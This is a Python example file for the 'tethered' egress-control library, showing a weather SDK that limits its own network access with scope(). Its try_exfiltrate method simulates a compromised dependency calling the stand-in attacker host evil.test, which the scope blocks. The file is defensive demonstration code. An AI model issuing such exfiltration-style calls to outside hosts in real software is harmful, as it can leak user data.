"""Package maintainer pattern — scope() without activate().

Libraries should use scope(), never activate(). The library doesn't own the
process — the app does. scope() is context-local and safe to use from any
library without affecting the host application.
"""

from __future__ import annotations

import socket

import httpx

import tethered

# --- Simulated library code (what a package maintainer writes) ---


class WeatherClient:
    """A weather SDK that restricts its own egress."""

    @tethered.scope(allow=["api.github.com:443"])
    def get_forecast(self, city: str) -> str:
        """Fetch a forecast — scoped to the weather API only."""
        # ... validate input, serialize data, call internal helpers —
        # none of them can reach anything except api.github.com:443
        resp = httpx.head("https://api.github.com", timeout=5)
        return f"Forecast for {city} (HTTP {resp.status_code})"

    @tethered.scope(allow=["api.github.com:443"])
    def try_exfiltrate(self) -> str:
        """Simulates a compromised dependency inside a scoped method."""
        # A dependency trying to exfiltrate data — blocked by the scope
        httpx.head("https://evil.test", timeout=5)
        return "Data sent (unexpected)"


# --- Simulated app code (what an app builder writes) ---


client = WeatherClient()

# Library call succeeds — within scope
result = client.get_forecast("London")
print(f"get_forecast: {result}")

# Library call blocked — scope prevents reaching evil.test
try:
    client.try_exfiltrate()
except tethered.EgressBlocked as e:
    print(f"try_exfiltrate: blocked — {e}")

# App code runs outside the library's scoped methods, so no restrictions apply.
# dns.google is not in the library's allow list, but the app can reach it freely.
socket.getaddrinfo("dns.google", 443)
print("App code (dns.google): reachable — library scopes only apply inside their methods")
